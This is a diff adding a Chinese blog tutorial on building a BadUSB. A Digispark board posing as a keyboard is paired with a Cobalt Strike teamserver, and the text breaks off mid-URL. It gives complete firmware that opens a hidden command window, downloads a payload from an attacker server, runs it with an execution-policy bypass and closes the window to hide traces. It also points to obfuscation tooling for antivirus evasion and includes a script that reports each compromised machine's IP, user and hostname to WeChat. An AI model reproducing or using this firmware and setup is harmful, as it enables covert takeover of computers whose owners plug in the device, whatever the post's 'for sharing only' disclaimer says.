@@ -1,0 +1,739 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/1.jpg">
+  <link rel="icon" href="/img/1.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Franky">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="（仅作为技术分享，请勿用于非法行为！！！） 实现原理：利用HID(Human InterfaceDevice，是计算机直接与人交互的设备，例如键盘、鼠标等)进行攻击，将USB设备伪装使电脑识别为键盘，再利用USB设备中的微控制芯片，向主机发送命令，从而实现完全控制主机。现在的USB设备很多，比如音视频设备、摄像头等，因此要求系统提供最大的兼容性，甚至免驱；所以在设计USB标准的时候没有要求每个US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="badsub制作">
+<meta property="og:url" content="http://example.com/2023/08/13/badsub%E5%88%B6%E4%BD%9C/index.html">
+<meta property="og:site_name" content="Franky&amp;blog">
+<meta property="og:description" content="（仅作为技术分享，请勿用于非法行为！！！） 实现原理：利用HID(Human InterfaceDevice，是计算机直接与人交互的设备，例如键盘、鼠标等)进行攻击，将USB设备伪装使电脑识别为键盘，再利用USB设备中的微控制芯片，向主机发送命令，从而实现完全控制主机。现在的USB设备很多，比如音视频设备、摄像头等，因此要求系统提供最大的兼容性，甚至免驱；所以在设计USB标准的时候没有要求每个US">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="d:\blog2\source_posts\badsub%E5%88%B6%E4%BD%9C.assets\image-20220813182311518.png">
+<meta property="og:image" content="d:\blog2\source_posts\badsub%E5%88%B6%E4%BD%9C.assets\image-20220813182941849.png">
+<meta property="og:image" content="d:\blog2\source_posts\badsub%E5%88%B6%E4%BD%9C.assets\image-20220813215724225.png">
+<meta property="og:image" content="d:\blog2\source_posts\badsub%E5%88%B6%E4%BD%9C.assets\image-20220813215826412.png">
+<meta property="og:image" content="d:\blog2\source_posts\badsub%E5%88%B6%E4%BD%9C.assets\image-20220813215538481.png">
+<meta property="og:image" content="d:\blog2\source_posts\badsub%E5%88%B6%E4%BD%9C.assets\image-20220813221012491.png">
+<meta property="og:image" content="d:\blog2\source_posts\badsub%E5%88%B6%E4%BD%9C.assets\image-20220813221722025.png">
+<meta property="og:image" content="d:\blog2\source_posts\badsub%E5%88%B6%E4%BD%9C.assets\image-20220813222635987.png">
+<meta property="og:image" content="d:\blog2\source_posts\badsub%E5%88%B6%E4%BD%9C.assets\image-20220813223610164.png">
+<meta property="article:published_time" content="2023-08-13T07:15:44.000Z">
+<meta property="article:modified_time" content="2024-02-24T20:11:19.643Z">
+<meta property="article:author" content="Franky">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="d:\blog2\source_posts\badsub%E5%88%B6%E4%BD%9C.assets\image-20220813182311518.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>badsub制作 - Franky&amp;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Franky</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="badsub制作"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-13 15:15" pubdate>
+          2023年8月13日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          15 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">badsub制作</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>（仅作为技术分享，请勿用于非法行为！！！）</p>
+<h3 id="实现原理："><a href="#实现原理：" class="headerlink" title="实现原理："></a>实现原理：</h3><p>利用HID(Human InterfaceDevice，是计算机直接与人交互的设备，例如键盘、鼠标等)进行攻击，将USB设备伪装使电脑识别为键盘，再利用USB设备中的微控制芯片，向主机发送命令，从而实现完全控制主机。现在的USB设备很多，比如音视频设备、摄像头等，因此要求系统提供最大的兼容性，甚至免驱；所以在设计USB标准的时候没有要求每个USB设备像网络设备那样占有一个唯一可识别的MAC地址让系统进行验证，而是允许一个USB设备具有多个输入输出设备的特征。这样就可以通过重写U盘固件，伪装成一个USB键盘，并通过虚拟键盘输入集成到U盘固件中的指令和代码而进行攻击。</p>
+<h3 id="准备阶段："><a href="#准备阶段：" class="headerlink" title="准备阶段："></a>准备阶段：</h3><p>硬件材料：Digispark （Attiny85）开发板</p>
+<p>云服务器一台（centos）</p>
+<p>CobaltStrike4.0</p>
+<p>Invoke-Obfuscation免杀脚本：<a target="_blank" rel="noopener" href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></p>
+<p>Arduino编程软件：<a target="_blank" rel="noopener" href="https://www.arduino.cc/en/donate/">https://www.arduino.cc/en/donate/</a></p>
+<p>驱动：<a target="_blank" rel="noopener" href="https://github.com/digistump/DigistumpArduino/blob/master/tools/micronucleus-2.0a4-win.zip">https://github.com/digistump/DigistumpArduino/blob/master/tools/micronucleus-2.0a4-win.zip</a></p>
+<h3 id="实现过程："><a href="#实现过程：" class="headerlink" title="实现过程："></a>实现过程：</h3><h5 id="1-部署cs4服务端"><a href="#1-部署cs4服务端" class="headerlink" title="1.部署cs4服务端"></a>1.部署cs4服务端</h5><p>上传cs4到云服务器(centos)，进入cs4目录，赋予teamserver运行权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 777 ./teamserver<br><br>SHELL<br></code></pre></td></tr></table></figure>
+
+<h5 id="2-下载screen"><a href="#2-下载screen" class="headerlink" title="2.下载screen"></a>2.下载screen</h5><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">yum install <span class="hljs-keyword">screen</span> -y<br><br><span class="hljs-built_in">SHELL</span><br></code></pre></td></tr></table></figure>
+
+<p>在linux远程会话的时候，使用screen可以很方便地进行会话管理而不需要担心<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=ssh&spm=1001.2101.3001.7020">ssh</a>断开后程序停止运行。</p>
+<p>常用命令</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">screen	</span>	<span class="hljs-comment">#新建一个screen会话</span><br><span class="hljs-keyword">screen </span>vi test.<span class="hljs-keyword">sh </span>  <span class="hljs-comment">#新建一个运行vi test.sh的screen会话，退出vi会自动退出该会话</span><br><span class="hljs-keyword">screen </span>-S &lt;<span class="hljs-keyword">screen_name&gt;	</span>	<span class="hljs-comment">#新建一个名为&lt;screen_name&gt;的screen会话</span><br><span class="hljs-keyword">screen </span>-ls			<span class="hljs-comment">#列出当前所有screen会话</span><br><span class="hljs-keyword">screen </span>-r &lt;<span class="hljs-keyword">screen_pid&gt; </span><span class="hljs-comment">#恢复id为&lt;screen_pid&gt;的会话</span><br><span class="hljs-keyword">screen </span>-r &lt;<span class="hljs-keyword">screen_name&gt; </span><span class="hljs-comment">#恢复名称为&lt;screen_name&gt;的会话</span><br><span class="hljs-keyword">screen </span>-d &lt;<span class="hljs-keyword">screen_name&gt; </span><span class="hljs-comment">#断开名称为&lt;screen_name&gt;的会话，但是会话的任务会继续执行</span><br><span class="hljs-keyword">screen </span>-d    <span class="hljs-comment">#断开当前的会话，但是会话的任务会继续执行</span><br><span class="hljs-keyword">screen </span>-D -r &lt;<span class="hljs-keyword">screen_pid&gt; </span><span class="hljs-comment">#用户断线后重连踢掉attached的screen会话</span><br>exit     <span class="hljs-comment">#在screen内输入exit会退出并关闭会话</span><br><span class="hljs-keyword">screen </span>-S &lt;<span class="hljs-keyword">screen_name&gt; </span>-X quit <span class="hljs-comment">#杀死名称为&lt;screen_name&gt;的会话</span><br><br><span class="hljs-keyword">SHELL</span><br></code></pre></td></tr></table></figure>
+
+<h5 id="3-运行cs"><a href="#3-运行cs" class="headerlink" title="3.运行cs"></a>3.运行cs</h5><p>创建一个screen窗口，用于运行cs服务端：</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">screen</span> -S cs4<span class="hljs-number">.0</span>  <span class="hljs-meta">#新建名为cs4的窗口</span><br>cd cs4目录  <br>vim teamserver <span class="hljs-meta">#修改cs4运行端口</span><br><br><span class="hljs-built_in">SHELL</span><br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/13/badsub%E5%88%B6%E4%BD%9C/image-20220813182311518.png"><img src="D:\blog2\source_posts\badsub制作.assets\image-20220813182311518.png" srcset="/img/loading.gif" lazyload alt="image-20220813182311518"></a></p>
+<p>image-20220813182311518</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">./teamserver ip 密码  <span class="hljs-comment">#运行cs4服务端</span><br>ctrl+a后，按d <span class="hljs-comment">#返回主窗口</span><br><br>BASH<br></code></pre></td></tr></table></figure>
+
+<h5 id="4-设置监听"><a href="#4-设置监听" class="headerlink" title="4.设置监听"></a>4.设置监听</h5><p>连接上cs客户端，并添加一个名为badusb的监听：</p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/13/badsub%E5%88%B6%E4%BD%9C/image-20220813182941849.png"><img src="D:\blog2\source_posts\badsub制作.assets\image-20220813182941849.png" srcset="/img/loading.gif" lazyload alt="image-20220813182941849"></a></p>
+<p>image-20220813182941849</p>
+<h5 id="5-生成免杀马"><a href="#5-生成免杀马" class="headerlink" title="5.生成免杀马"></a>5.生成免杀马</h5><p>菜单栏 攻击–&gt;生成后门–&gt;Payload Generator</p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/13/badsub%E5%88%B6%E4%BD%9C/image-20220813215724225.png"><img src="D:\blog2\source_posts\badsub制作.assets\image-20220813215724225.png" srcset="/img/loading.gif" lazyload alt="image-20220813215724225"></a></p>
+<p>image-20220813215724225</p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/13/badsub%E5%88%B6%E4%BD%9C/image-20220813215826412.png"><img src="D:\blog2\source_posts\badsub制作.assets\image-20220813215826412.png" srcset="/img/loading.gif" lazyload alt="image-20220813215826412"></a></p>
+<p>image-20220813215826412</p>
+<p>可以使用Invoke-Obfuscation进行免杀，这里不再演示</p>
+<p>在云服务器上安装httpd服务，并将木马上传到默认的网站根目录：&#x2F;var&#x2F;www&#x2F;html&#x2F;下，网页访问试试能不能下载到，之后会通过badusb的脚本来访问这个链接：</p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/13/badsub%E5%88%B6%E4%BD%9C/image-20220813215538481.png"><img src="D:\blog2\source_posts\badsub制作.assets\image-20220813215538481.png" srcset="/img/loading.gif" lazyload alt="image-20220813215538481"></a></p>
+<p>image-20220813215538481</p>
+<p>如若访问不成功，检查服务器云防护端口是否开放</p>
+<h5 id="6-软件安装"><a href="#6-软件安装" class="headerlink" title="6.软件安装"></a>6.软件安装</h5><p>烧录前需要准备两个软件：Arduino软件、Digispark （Attiny85）开发板驱动。</p>
+<p>Arduino可以去官网免费下载：材料准备阶段查看</p>
+<p>驱动下载：材料准备阶段查看</p>
+<p>将驱动解压，选择文件夹中的DPinst.exe或DPinst64.exe双击运行，这取决于你自己的机器是32位还是64位：</p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/13/badsub%E5%88%B6%E4%BD%9C/image-20220813221012491.png"><img src="D:\blog2\source_posts\badsub制作.assets\image-20220813221012491.png" srcset="/img/loading.gif" lazyload alt="image-20220813221012491"></a></p>
+<p>image-20220813221012491</p>
+<h5 id="7-制作badusb烧录"><a href="#7-制作badusb烧录" class="headerlink" title="7.制作badusb烧录"></a>7.制作badusb烧录</h5><p>打开arduino，就可以设计badusb插入后要执行的程序了，这块在学习中能了解到，是一块很庞大的知识，利用好了能产生无限可能。想</p>
+<p>想就相当于badusb插入靶机后，你就在靶机里获得了一个虚拟键盘和鼠标的权限，想开什么端口，反弹shell，或是关掉杀毒软件，防火</p>
+<p>墙等等，都可以通过编程实现。</p>
+<p>但这次我的目的只是制作一个能配合CS4上线的badusb玩具，所以仅限于反弹shell方面的代码：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta"># <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;DigiKeyboard.h&quot;</span></span><br>\<span class="hljs-meta"># <span class="hljs-keyword">define</span> KEY_ESC 41</span><br>\<span class="hljs-meta"># <span class="hljs-keyword">define</span> KEY_BACKSPACE 42</span><br>\<span class="hljs-meta"># <span class="hljs-keyword">define</span> KEY_TAB 43</span><br>\<span class="hljs-meta"># <span class="hljs-keyword">define</span> KEY_PRT_SCR 70</span><br>\<span class="hljs-meta"># <span class="hljs-keyword">define</span> KEY_DELETE 76</span><br>\<span class="hljs-meta"># <span class="hljs-keyword">define</span> KEY_CAPS_LOCK 0x39</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setup</span><span class="hljs-params">()</span> </span>&#123;<br>DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">3000</span>);<br>DigiKeyboard.<span class="hljs-built_in">sendKeyStroke</span>(KEY_R,MOD_GUI_LEFT); <span class="hljs-comment">//win+R</span><br>DigiKeyboard.<span class="hljs-built_in">sendKeyStroke</span>(KEY_CAPS_LOCK); <span class="hljs-comment">//大小写转换绕过中文输入法</span><br>DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);<br>DigiKeyboard.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;CMD /t:01 /k @ECHO OFF &amp;&amp; MODE CON:cols=15 lines=1&quot;</span>); <span class="hljs-comment">//最小化cmd窗口</span><br>DigiKeyboard.<span class="hljs-built_in">sendKeyStroke</span>(KEY_ENTER); <span class="hljs-comment">//回车</span><br>DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);<br>DigiKeyboard.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;mkdir C:\\test&quot;</span>); <span class="hljs-comment">//C盘创建一个test目录</span><br>DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">1000</span>);<br>DigiKeyboard.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;powershell&quot;</span>);<br>DigiKeyboard.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;$clnt = new-object system.net.webclient;&quot;</span>);<br>DigiKeyboard.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;$url= &#x27;http://xxx.xxx.xxx.xxx/p64&#x27;;&quot;</span>);<br>DigiKeyboard.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;$file = &#x27;c:\\test\\b.ps1&#x27;;&quot;</span>);<br>DigiKeyboard.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;$clnt.downloadfile($url,$file)&quot;</span>); <span class="hljs-comment">//分段执行，绕过防火墙进程保护，从云端下载木马到本地C盘test目录，并命名为b.ps1</span><br>DigiKeyboard.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;powershell.exe -executionpolicy bypass -file c:\\test\\b.ps1&quot;</span>); <span class="hljs-comment">//本地权限绕过执行木马</span><br>DigiKeyboard.<span class="hljs-built_in">sendKeyStroke</span>(KEY_ENTER);<br>DigiKeyboard.<span class="hljs-built_in">sendKeyStroke</span>(KEY_R,MOD_GUI_LEFT); <span class="hljs-comment">//win+R</span><br>DigiKeyboard.<span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);<br>DigiKeyboard.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;taskkill /t /im conhost.exe /f&quot;</span>); <span class="hljs-comment">//关闭cmd的宿主程序，即图形界面</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">loop</span><span class="hljs-params">()</span> </span>&#123;<br>&#125;<br><br>REASONML<br></code></pre></td></tr></table></figure>
+
+<p>编译没问题后，点击右箭头烧录，然后在60s内将U盘插入，等待提示烧录成功即可：</p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/08/13/badsub%E5%88%B6%E4%BD%9C/image-20220813221722025.png"><img src="D:\blog2\source_posts\badsub制作.assets\image-20220813221722025.png" srcset="/img/loading.gif" lazyload alt="image-20220813221722025"></a></p>
+<p>image-20220813221722025</p>
+<h5 id="8-CS4微信上线提示设置"><a href="#8-CS4微信上线提示设置" class="headerlink" title="8.CS4微信上线提示设置"></a>8.CS4微信上线提示设置</h5><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs llvm">访问Server酱https://sct.ftqq.com/<br><br>直接用微信扫码关注公众号就可以登陆，然后Server酱就会给你生成一个SendKey，用这个东西配合以下脚本：<br><br>\# 循环获取所有beacon<br>on beacon_initial &#123;<br><br><span class="hljs-keyword">sub</span> http_get &#123;<br>local(&#x27;$output&#x27;)<span class="hljs-comment">;</span><br>$url <span class="hljs-operator">=</span> [new java.net.URL: $<span class="hljs-number">1</span>]<span class="hljs-comment">;</span><br>$stream <span class="hljs-operator">=</span> [$url openStream]<span class="hljs-comment">;</span><br>$handle <span class="hljs-operator">=</span> [SleepUtils getIOHandle: $stream<span class="hljs-punctuation">,</span> $<span class="hljs-keyword">null</span>]<span class="hljs-comment">;</span><br><span class="hljs-comment"></span><br><span class="hljs-title">@content</span> <span class="hljs-operator">=</span> readAll($handle)<span class="hljs-comment">;</span><br><span class="hljs-comment"></span><br>foreach $line (<span class="hljs-title">@content</span>) &#123;<br>$output .<span class="hljs-operator">=</span> $line . <span class="hljs-string">&quot;\r\n&quot;</span><span class="hljs-comment">;</span><br>&#125;<br><br>println($output)<span class="hljs-comment">;</span><br>&#125;<br>\# 获取ip、计算机名、登录账号<br>$externalIP <span class="hljs-operator">=</span> replace(beacon_info($<span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;external&quot;</span>)<span class="hljs-punctuation">,</span> <span class="hljs-string">&quot; &quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;_&quot;</span>)<span class="hljs-comment">;</span><br>$internalIP <span class="hljs-operator">=</span> replace(beacon_info($<span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;internal&quot;</span>)<span class="hljs-punctuation">,</span> <span class="hljs-string">&quot; &quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;_&quot;</span>)<span class="hljs-comment">;</span><br>$userName <span class="hljs-operator">=</span> replace(beacon_info($<span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;user&quot;</span>)<span class="hljs-punctuation">,</span> <span class="hljs-string">&quot; &quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;_&quot;</span>)<span class="hljs-comment">;</span><br>$computerName <span class="hljs-operator">=</span> replace(beacon_info($<span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;computer&quot;</span>)<span class="hljs-punctuation">,</span> <span class="hljs-string">&quot; &quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;_&quot;</span>)<span class="hljs-comment">;</span><br><span class="hljs-comment"></span><br>\# get一下Server酱的链接<br>$url <span class="hljs-operator">=</span> &#x27;https://sc.ftqq.com/此处填写你Server酱的SCKEY码.send?text<span class="hljs-operator">=</span>CobaltStrike<span class="hljs-variable">%e4</span><span class="hljs-variable">%b8</span><span class="hljs-variable">%8</span>a<span class="hljs-variable">%e7</span><span class="hljs-variable">%ba</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%e6</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%90</span><span class="hljs-variable">%e9</span><span class="hljs-variable">%86</span><span class="hljs-variable">%92</span>&amp;desp<span class="hljs-operator">=</span><span class="hljs-variable">%e4</span><span class="hljs-variable">%bb</span><span class="hljs-variable">%96</span><span class="hljs-variable">%e6</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%a5</span><span class="hljs-variable">%e4</span><span class="hljs-variable">%ba</span><span class="hljs-variable">%86</span><span class="hljs-variable">%e3</span><span class="hljs-variable">%80</span><span class="hljs-variable">%81</span><span class="hljs-variable">%e4</span><span class="hljs-variable">%bb</span><span class="hljs-variable">%96</span><span class="hljs-variable">%e6</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%a5</span><span class="hljs-variable">%e4</span><span class="hljs-variable">%ba</span><span class="hljs-variable">%86</span><span class="hljs-variable">%ef</span><span class="hljs-variable">%bc</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%e4</span><span class="hljs-variable">%bb</span><span class="hljs-variable">%96</span><span class="hljs-variable">%e8</span><span class="hljs-variable">%84</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%e8</span><span class="hljs-variable">%b8</span><span class="hljs-variable">%8</span>f<span class="hljs-variable">%e7</span><span class="hljs-variable">%a5</span><span class="hljs-variable">%a5</span><span class="hljs-variable">%e4</span><span class="hljs-variable">%ba</span><span class="hljs-variable">%91</span><span class="hljs-variable">%e8</span><span class="hljs-variable">%b5</span><span class="hljs-variable">%b0</span><span class="hljs-variable">%e6</span><span class="hljs-variable">%9</span>d<span class="hljs-variable">%a5</span><span class="hljs-variable">%e4</span><span class="hljs-variable">%ba</span><span class="hljs-variable">%86</span><span class="hljs-variable">%e3</span><span class="hljs-variable">%80</span><span class="hljs-variable">%82</span><span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%0</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%e5</span><span 